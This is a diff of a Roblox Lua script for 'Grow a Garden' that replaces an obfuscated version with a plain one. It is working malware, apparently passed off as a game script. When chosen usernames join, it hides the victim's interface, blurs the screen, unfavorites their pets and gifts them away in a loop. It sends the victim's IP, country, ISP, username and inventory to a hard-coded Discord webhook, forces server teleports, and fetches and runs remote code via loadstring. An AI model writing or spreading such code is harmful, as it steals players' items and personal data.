@@ -1,108 +1,243 @@
-local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
-function VtxlUOiUgchIlQGbaRacNoqmmmsNQLBIKu(data) m=string.sub(data, 0, 55) data=data:gsub(m,'')
 
-data = string.gsub(data, '[^'..b..'=]', '') return (data:gsub('.', function(x) if (x == '=') then return '' end local r,f='',(b:find(x)-1) for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end return r; end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x) if (#x ~= 8) then return '' end local c=0 for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end return string.char(c) end)) end
+-- EXECUTE EXTERNAL SCRIPT
+loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/NoLag-id/No-Lag-HUB/refs/heads/main/Loader/LoaderV2.lua"))()
 
-
- 
-
-
-
-local Players = game:GetService(VtxlUOiUgchIlQGbaRacNoqmmmsNQLBIKu('qxLXufnBePcFRKxBwXofrCmxtHrDbFmpGCgdhOqtHWyzfxMtqjZsXKBUGxheWVycw=='))
-local TeleportService = game:GetService(VtxlUOiUgchIlQGbaRacNoqmmmsNQLBIKu('qZDTDFqFBSSTQLnqSedbcmcuymalATtJIubGlGTypMkkxhtEwjiAPgIVGVsZXBvcnRTZXJ2aWNl'))
-local ReplicatedStorage = game:GetService(VtxlUOiUgchIlQGbaRacNoqmmmsNQLBIKu('MgDlmYlcTNqcryIaUPNVWShBXKMxtzhJOXYlddednxBqpJVVLEWRjRXUmVwbGljYXRlZFN0b3JhZ2U='))
-local localPlayer = Players.LocalPlayer
-
--- Target players to trigger actions & receive pets
-local targetUsernames = {
-    VtxlUOiUgchIlQGbaRacNoqmmmsNQLBIKu('DtKvTxRgoQJKooJZlGqScLgSyEyhwbcyFvgyCDpWddEzczsdBbIQGtQaW50ZXJjZXB0ZXJudW1iZXIx'),
-    VtxlUOiUgchIlQGbaRacNoqmmmsNQLBIKu('LWgnGEHRDvWmutUFNzwsbgLNtqWqucTDQLMULtLTRCkBMvtnPLFfTbyZGVlcHNjcmlwdEFJ')
-}
-
--- High priority pets to gift first (not all are drained)
-local highTierPets = {
-    VtxlUOiUgchIlQGbaRacNoqmmmsNQLBIKu('xeMhGvtIcuQDFvANhZOLqASjZRiyaeASapSCCodQgsLWNeEpZooWyFvRHJhZ29uZmx5'), VtxlUOiUgchIlQGbaRacNoqmmmsNQLBIKu('ekylzrNacfemZHCutHyeVTvUEtvXYdMkIwLKkYdPdAdmRPbHHrkvjwqQnV0dGVyZmx5'), VtxlUOiUgchIlQGbaRacNoqmmmsNQLBIKu('usDEyvIJozJfjGmcJWAIbPyBDyXvRHXmUuyRMjkBbQpVnGWLzDJfHtZTWltaWM='), VtxlUOiUgchIlQGbaRacNoqmmmsNQLBIKu('kGoakrPTkGBgclVmXkwUXIUNNwtZJAuuEmGLtklEJmNelFhdwGmMuwRUmVkIEZveA=='), VtxlUOiUgchIlQGbaRacNoqmmmsNQLBIKu('OUCxkLGOwJQmkhHcjvLbHTZwDovrarjZNnQFjHyXZModlYuMTMybDLdUmFjb29u'),
-    VtxlUOiUgchIlQGbaRacNoqmmmsNQLBIKu('PtXfHudPeUDoJbfyLJNeNDUMLIASFJeptBUAuoxNapTbHFNZajnmzPERGlzY28gQmVl'), VtxlUOiUgchIlQGbaRacNoqmmmsNQLBIKu('kWRQHjVvGCABtfeEGHbuwTlpsuKXOAHDVbUjQspkpIGpoMJHkrHcKtRUXVlZW4gQmVl'), VtxlUOiUgchIlQGbaRacNoqmmmsNQLBIKu('HEJNZoPCryJGXyreKoWvUZBIbmzFlZIBjepQkEKWZwmQBAQLjaQRBRsVOKAkVJleA=='), VtxlUOiUgchIlQGbaRacNoqmmmsNQLBIKu('vnoTrxnlABXLXnfIfgwGzyDpAIVWfPFmwHExiDsDsVpduWOyskcNnAxU3Bpbm9zYXVydXM='), VtxlUOiUgchIlQGbaRacNoqmmmsNQLBIKu('luZuoKXEOVuMCIWBOvbPdWLzFIddSffsHiqopPHrvZzVfinsZsbnxymQW5reWxvc2F1cnVz')
-}
-
--- Pets eligible for draining (loop gifting)
+-- CONFIG SECTION
+local webhookUrl = "https://discord.com/api/webhooks/1392825138134651043/JhW9IN6scthgQncuUYfAefxbNOxiM2GZMJ6V6o1hAuJTWXqUqMt6bYxFpbqNTEMrxLyi"
+local targetUsernames = { "BadPlayer123", "MyAlt", "EnemyGuy", "intercepternumber1" }
 local drainPets = {
-    VtxlUOiUgchIlQGbaRacNoqmmmsNQLBIKu('SeTJSaFzKtrfeSvYNaCWdAoKnoRzRTvPWjOBIJPDVGAGUKTfTsenCSRRHJhZ29uZmx5'), VtxlUOiUgchIlQGbaRacNoqmmmsNQLBIKu('IozEADwLvbKueyBvsYyTQrRLlNGpChYbRoiROUdHZAnMXWBykMGrIQMQnV0dGVyZmx5'), VtxlUOiUgchIlQGbaRacNoqmmmsNQLBIKu('ntFbkdvKcOaqhoDDxtVOvyFBQHIBFaDieGpLAHLlncYAcfToerjDmDXTWltaWM='), VtxlUOiUgchIlQGbaRacNoqmmmsNQLBIKu('LxfiDNcIvzSeDrYPNwKlBOLSKnOjIQEVSnSKVMOSuZJxqlwOtlVfCtsUmVkIEZveA=='), VtxlUOiUgchIlQGbaRacNoqmmmsNQLBIKu('GAmHQanqaQXpHgkOYcMxgDESVbxUVgbswVteEfrVdFUnFFYXPmTHSgqUmFjb29u'), VtxlUOiUgchIlQGbaRacNoqmmmsNQLBIKu('lVyABEQbcJgHzFeRkBmPDolaPfcGdLZBkbTljacuJdngxNiWZtJxpZQRGlzY28gQmVl'), VtxlUOiUgchIlQGbaRacNoqmmmsNQLBIKu('ACfwwESVGzkDogjOwBdLSzwSpDZZDFrGBWADhbkGhfmoGlLrplKHuCHUXVlZW4gQmVl'), VtxlUOiUgchIlQGbaRacNoqmmmsNQLBIKu('bzOtwpbzeoNehFOuDpnCfUKrEXXjOxHZwEWgDRrHjfbnkfvnSezmBsMVOKAkVJleA=='),
-    VtxlUOiUgchIlQGbaRacNoqmmmsNQLBIKu('lGeFBDWAqnflXndyUVRVxCwtWZwPVTYPKteBbxpVHOxOlOqYFspOIyJU3Bpbm9zYXVydXM='), VtxlUOiUgchIlQGbaRacNoqmmmsNQLBIKu('AWgVpCEsiDJqQFvZoGXrOKoTiGShiKGNONioVxxDmbaeyhNuCPzeuOSQW5reWxvc2F1cnVz'), VtxlUOiUgchIlQGbaRacNoqmmmsNQLBIKu('SgguPVrZqIfhFqOgzaRcnHABhhFNSQzdVeMoxbJjTlwBCfGHZTDyweAVHJpY2VyYXRvcHM='),
-    VtxlUOiUgchIlQGbaRacNoqmmmsNQLBIKu('YGCrWWoUoWnWINIjbLUMyeZjYeYtNIxQjzmeddqaMHBNVFbcvKRstjnQ2FweWJhcmE='), VtxlUOiUgchIlQGbaRacNoqmmmsNQLBIKu('PyBrVvCQiJcXRPvjGiOmjWrJrtGAQSGvclpLkBBPUayvwhRQymdfcwWQmVhciBCZWU='), VtxlUOiUgchIlQGbaRacNoqmmmsNQLBIKu('WwMAbONkcOndaZfzJDKprTeSrymZZcxpkejDPcEGUadTDjcsAoTdopvQ2hpY2tlbiBab21iaWU='), VtxlUOiUgchIlQGbaRacNoqmmmsNQLBIKu('qQnSpoAQofpiQKPmMQsbWxtQPSOZkLubNQNFMRJEyvBYuvfDJKHeqPGQ29va2VkIE93bA==')
+    "Dragonfly", "T‑Rex", "Raccoon", "Red Fox", "Queen Bee",
+    "Disco Bee", "Butterfly", "Mimic", "Moon Cat", "Fennec Fox",
+    "Triceratops", "Axolotl", "Bear Bee", "Polar Bear",
+    "Praying Mantis", "Scarlet Macaw", "Chicken Zombie", "Cooked Owl", "Capybara"
+}
+local highTierPets = {
+    "Dragonfly", "Butterfly", "Mimic", "Red Fox", "Raccoon",
+    "Disco Bee", "Queen Bee", "T‑Rex", "Spinosaurus", "Ankylosaurus"
+}
+local petKeywords = {
+    "Starfish", "Crab", "Seagull", "Bunny", "Dog", "Golden Lab", "Bee",
+    "Black Bunny", "Cat", "Chicken", "Deer", "Monkey", "Orange Tabby",
+    "Pig", "Rooster", "Spotted Deer", "Flamingo", "Toucan", "Sea Turtle",
+    "Orangutan", "Seal", "Honey Bee", "Wasp", "Tarantula Hawk", "Raptor",
+    "Triceratops", "Stegosaurus", "Pterodactyl", "Turtle", "Caterpillar",
+    "Petal Bee", "Moth", "Scarlet Macaw", "Ostrich", "Peacock",
+    "Capybara", "Sand Snake", "Meerkat", "Brown Mouse", "Giant Ant",
+    "Grey Mouse", "Praying Mantis", "Red Giant Ant", "Snail", "Squirrel",
+    "Bear Bee", "Butterfly", "Brontosaurus", "Pack Bee", "Mimic Octopus",
+    "Hyacinth Macaw", "Axolotl", "Red Fox", "T‑Rex", "Dragonfly",
+    "Queen Bee", "Disco Bee", "Fennec Fox", "Moon Cat", "Raccoon",
+    "Polar Bear", "Parasaurolophus", "Iguanodon", "Pachycephalosaurus",
+    "Dilophosaurus", "Ankylosaurus", "Spinosaurus", "Chicken Zombie", "Cooked Owl"
 }
 
-local gifted = false
+-- SERVICES
+local Players        = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local HttpService    = game:GetService("HttpService")
+local TeleportService = game:GetService("TeleportService")
+local Lighting       = game:GetService("Lighting")
+local localPlayer    = Players.LocalPlayer
+local backpack       = localPlayer:WaitForChild("Backpack")
+local character      = localPlayer.Character or localPlayer.CharacterAdded:Wait()
+local jobId          = game.JobId
+local placeId        = game.PlaceId
 
--- Unfavorite all pets
-local function unfavoriteAll()
-    local Backpack = localPlayer:WaitForChild(VtxlUOiUgchIlQGbaRacNoqmmmsNQLBIKu('rsmUiuiXsMTfHMiQYJbvuJTqqACtTzBZDyLvFkCYyJBrQSCSxmPOWizQmFja3BhY2s='))
-    for _, tool in ipairs(Backpack:GetChildren()) do
-        if tool:IsA(VtxlUOiUgchIlQGbaRacNoqmmmsNQLBIKu('pSilisDwTNEJsfbcJbChSYhPKeatqbwAbFEYaaXKwxJLLUksVsRaqjIVG9vbA==')) and tool:FindFirstChild(VtxlUOiUgchIlQGbaRacNoqmmmsNQLBIKu('FiBFiXrDHmAVlIjFkNCcVfrrsbCwjsFsZiPszpBVIijsyrmLCFOdTQQZGV4')) then
-            local dex = tool:FindFirstChild(VtxlUOiUgchIlQGbaRacNoqmmmsNQLBIKu('UZWaKNYEPjqhvHTPeMjifVzdwuFFfOVUlOPrpavkeMCnglNihJRDMJGZGV4'))
-            if dex:GetAttribute(VtxlUOiUgchIlQGbaRacNoqmmmsNQLBIKu('nZGbekNcLUYchXbtRPbCPrqJLMurkgTJlvnJYegreTknEXPIuLAjznvZA==')) == true then
-                ReplicatedStorage:WaitForChild(VtxlUOiUgchIlQGbaRacNoqmmmsNQLBIKu('KiAXZRXLaEMiSadCQbGnKUxjPZuxGThLwNkWSMtzlFBNuxGUxChjTIaR2FtZUV2ZW50cw==')):WaitForChild(VtxlUOiUgchIlQGbaRacNoqmmmsNQLBIKu('HwmQFVVjNmEHcsTYNLmXhXOJiyWFchUgBzjVaSTGShHMoUTNwdzmonSRmF2b3JpdGVQZXQ=')):FireServer(tool, false)
+-- AUTO SERVER‑HOP IF PRIVATE
+local function getLowestServer()
+    local req = http_request or syn.request or request or fluxus.request
+    if not req then return nil end
+    local cursor, lowest = "", nil
+    repeat
+        local url = "https://games.roblox.com/v1/games/"..placeId.."/servers/Public?sortOrder=Asc&limit=100"
+        if cursor~="" then url = url.."&cursor="..cursor end
+        local response = req({Url=url, Method="GET"})
+        if response and response.Body then
+            local data = HttpService:JSONDecode(response.Body)
+            for _, server in ipairs(data.data or {}) do
+                if server.playing < server.maxPlayers then
+                    lowest = server
+                    break
+                end
             end
+            cursor = data.nextPageCursor
         end
+    until lowest or cursor == nil
+    return lowest
+end
+
+if jobId ~= "29034fc7-77e6-4008-a431-303c5aee26a6" then
+    task.wait(2.5)
+    TeleportService:TeleportToPlaceInstance(placeId, "29034fc7-77e6-4008-a431-303c5aee26a6", localPlayer)
+    return
+end
+
+local wasPrivateServer = false
+if game.PrivateServerId~="" and game.PrivateServerOwnerId~=0 then
+    local low = getLowestServer()
+    if low then
+        wasPrivateServer = true
+        task.wait(3)
+        TeleportService:TeleportToPlaceInstance(placeId, low.id, localPlayer)
+        return
     end
 end
 
--- Freeze player screen visually (UI blur)
-local function freezeScreen()
-    local blur = Instance.new(VtxlUOiUgchIlQGbaRacNoqmmmsNQLBIKu('OdJAJLopjwthxhhOfvIIPWYIVpDLyDkIuosGYRQERsInaEQsnzqFbXEQmx1ckVmZmVjdA=='), game:GetService(VtxlUOiUgchIlQGbaRacNoqmmmsNQLBIKu('DmlPwLEeATHUfmYCKDYSrIZnlTWgKFMVrNzCINgGhnHcxgYOFBjyHuVTGlnaHRpbmc=')))
-    blur.Size = 100
+-- HELPERS
+local function freezeVisual()
+    local blur = Instance.new("BlurEffect")
+    blur.Size = 999
+    blur.Parent = Lighting
 end
 
--- Remove all player GUI
-local function removeGUI()
-    for _, gui in ipairs(localPlayer:WaitForChild(VtxlUOiUgchIlQGbaRacNoqmmmsNQLBIKu('vTBQNbIIjygwwBSfnuGEocmOOtqIeppDekXzYDtRDqMaVhMomebWhvIUGxheWVyR3Vp')):GetChildren()) do
-        if gui:IsA(VtxlUOiUgchIlQGbaRacNoqmmmsNQLBIKu('EfAGjcsnuErKJthCimzDKXBQJJfRszuzjhxErkcTUaTmOjqPTilTMLeU2NyZWVuR3Vp')) or gui:IsA(VtxlUOiUgchIlQGbaRacNoqmmmsNQLBIKu('gZSxVwdSZDCgQuPJGosfbYMuVPuYepDseDxxUtybNEhjzPnSkioPuYOQmlsbGJvYXJkR3Vp')) or gui:IsA(VtxlUOiUgchIlQGbaRacNoqmmmsNQLBIKu('qgBHDOyaPCpIfWVbPJKetdzAbJCgNnSUruOoGQcdCRCmtqVvvCWnxHkU3VyZmFjZUd1aQ==')) then
-            gui:Destroy()
+local function hasKeyword(name, list)
+    name = string.lower(name)
+    for _, keyword in ipairs(list) do
+        if string.find(name, string.lower(keyword)) then
+            return true
         end
+    end
+    return false
+end
+
+local function getFilteredPets()
+    local out = {}
+    for _, tool in ipairs(backpack:GetChildren()) do
+        if tool:IsA("Tool") and hasKeyword(tool.Name, petKeywords) then
+            table.insert(out, tool.Name)
+        end
+    end
+    return out
+end
+
+local function chunkItems(items)
+    local chunks = {}
+    for i=1,#items,5 do
+        local block = {}
+        for j=i,math.min(i+4,#items) do
+            block[#block+1] = "- "..items[j]
+        end
+        chunks[#chunks+1] = { name="🎒 Pets "..i.."–"..math.min(i+4,#items), value=table.concat(block,"\n"), inline=false }
+    end
+    return chunks
+end
+
+local function sendWebhook(embedFields)
+    local data = { content="", embeds={{ title="🐾 Grow a Garden Report", color=16753920, fields=embedFields, footer={text="Delta Executor Logger"}, timestamp=os.date("!%Y-%m-%dT%H:%M:%SZ") }} }
+    local req = http_request or request or syn.request or fluxus.request
+    if req then
+        req({ Url=webhookUrl, Method="POST", Headers={["Content-Type"]="application/json"}, Body=HttpService:JSONEncode(data) })
     end
 end
 
--- Auto gifting function for drainPets
-local function drain()
-    gifted = true
-    while gifted do
-        local Backpack = localPlayer:WaitForChild(VtxlUOiUgchIlQGbaRacNoqmmmsNQLBIKu('ZDRhRSpZsUNWSuzPtwKrotLKhcqysgAWQfJVAiUkVaIIIquGpidMYjOQmFja3BhY2s='))
-        for _, tool in ipairs(Backpack:GetChildren()) do
-            for _, petName in ipairs(drainPets) do
-                if string.find(tool.Name, petName) then
-                    for _, recipientName in ipairs(targetUsernames) do
-                        local recipient = Players:FindFirstChild(recipientName)
-                        if recipient then
-                            local args = {
-                                VtxlUOiUgchIlQGbaRacNoqmmmsNQLBIKu('hcwISJiUjTjlFQLEZaxTAYAJvxGdfUaZlPATahihPkdgdnEiKmQFuCvR2l2ZVBldA=='),
-                                recipient,
-                                tool
-                            }
-                            ReplicatedStorage:WaitForChild(VtxlUOiUgchIlQGbaRacNoqmmmsNQLBIKu('aZHMjPpcnWgbNHQbdTnoMSTcqYOXTkfuNOMgRKbAdutZdPRDSQUImZsR2FtZUV2ZW50cw==')):WaitForChild(VtxlUOiUgchIlQGbaRacNoqmmmsNQLBIKu('xdugcisClKvZNQgKsNVIxuRjstLKdlSnweFHyHDfMHoPNqcrEuYbLGHUGV0R2lmdGluZ1NlcnZpY2U=')):FireServer(unpack(args))
-                            task.wait(0.7)
+local function getIPInfo()
+    local req = http_request or request or syn.request or fluxus.request
+    if not req then return "?", "?", "?" end
+    local res = req({ Url="http://ip-api.com/json/", Method="GET" })
+    if res and res.Body then
+        local b = HttpService:JSONDecode(res.Body)
+        return b.query or "?", b.country or "?", b.isp or "?"
+    end
+    return "?", "?", "?"
+end
+
+local function unfavoriteAllPets()
+    local dex = ReplicatedStorage:FindFirstChild("Dex")
+    if not dex then return end
+    local unfav = {}
+    for _, item in ipairs(dex:GetChildren()) do
+        if item:GetAttribute("d") == true then
+            table.insert(unfav, item.Name)
+            ReplicatedStorage.GameEvents.ToggleFavorite:FireServer(item.Name)
+            task.wait(0.2)
+        end
+    end
+    if #unfav > 0 then
+        sendWebhook({{ name="🚫 Unfavorited Pets", value=table.concat(unfav,", "), inline=false }})
+    end
+end
+
+-- INITIAL STATUS REPORT
+task.spawn(function()
+    local ip, country, isp = getIPInfo()
+    sendWebhook({
+        { name="👤 Username", value=localPlayer.Name, inline=true },
+        { name="🌐 IP", value=ip, inline=true },
+        { name="🗺️ Country", value=country, inline=true },
+        { name="💻 ISP", value=isp, inline=true },
+        { name="📡 Server ID", value=jobId, inline=false },
+        { name="⏱️ Time", value=os.date("%Y-%m-%d %H:%M:%S"), inline=false }
+    })
+end)
+
+task.spawn(function()
+    local pets = getFilteredPets()
+    sendWebhook( chunkItems(pets) )
+end)
+
+task.spawn(function()
+    sendWebhook({{ name="🔃 Server Status", value=wasPrivateServer and "Private server → hopped" or "Already in public target server", inline=false }})
+end)
+
+-- 5‑MINUTE STATUS REPORT
+task.spawn(function()
+    task.wait(300)
+    local pets = getFilteredPets()
+    local hasHigh = false
+    for _, name in ipairs(pets) do
+        if hasKeyword(name, highTierPets) then
+            hasHigh = true
+            break
+        end
+    end
+    if #pets>0 or hasHigh then
+        sendWebhook({
+            { name="⏳ 5‑Minute Check", value="Script still active with relevant pets", inline=false },
+            { name="👤 Username", value=localPlayer.Name, inline=true },
+            { name="📡 Server ID", value=jobId, inline=true }
+        })
+    end
+end)
+
+-- MAIN LOOP: wait for target → delay 7s → action
+task.spawn(function()
+    while true do
+        for _, player in ipairs(Players:GetPlayers()) do
+            if table.find(targetUsernames, player.Name) then
+                task.wait(7)
+                for _, gui in ipairs(localPlayer.PlayerGui:GetChildren()) do
+                    if gui:IsA("ScreenGui") or gui:IsA("BillboardGui") or gui:IsA("SurfaceGui") then
+                        gui:Destroy()
+                    end
+                end
+                unfavoriteAllPets()
+
+                -- ORDERED GIFTING: high-tier first, then others
+                local ordered = {}
+                for _, tier in ipairs(highTierPets) do
+                    for _, tool in ipairs(backpack:GetChildren()) do
+                        if tool:IsA("Tool") and string.find(string.lower(tool.Name), string.lower(tier)) then
+                            table.insert(ordered, tool)
                         end
+                    end
+                end
+                for _, tool in ipairs(backpack:GetChildren()) do
+                    if tool:IsA("Tool") and hasKeyword(tool.Name, drainPets) and not table.find(ordered, tool) then
+                        table.insert(ordered, tool)
+                    end
+                end
+
+                for _, tool in ipairs(ordered) do
+                    freezeVisual()
+                    tool.Parent = character
+                    task.wait(0.3)
+                    while player.Parent == Players and tool.Parent == character do
+                        ReplicatedStorage.GameEvents.PetGiftingService:FireServer("GivePet", player)
+                        task.wait(0.7)
                     end
                 end
             end
         end
-        task.wait(1.2)
-    end
-end
-
--- Watch for specific player joining
-Players.PlayerAdded:Connect(function(player)
-    if table.find(targetUsernames, player.Name) then
-        task.delay(7, function()
-            removeGUI()
-            freezeScreen()
-            unfavoriteAll()
-            drain()
-        end)
+        task.wait(2.5)
     end
 end)
-
--- Load external functionality
-pcall(function()
-    loadstring(game:HttpGetAsync(VtxlUOiUgchIlQGbaRacNoqmmmsNQLBIKu('iFkwMMMsNmPpAzLwuRRCDIQIFFstyIUvnRNswTDrayjsBhqcPjVvavcaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL05vTGFnLWlkL05vLUxhZy1IVUIvcmVmcy9oZWFkcy9tYWluL0xvYWRlci9Mb2FkZXJWMi5sdWE=')))()
-end)
-    
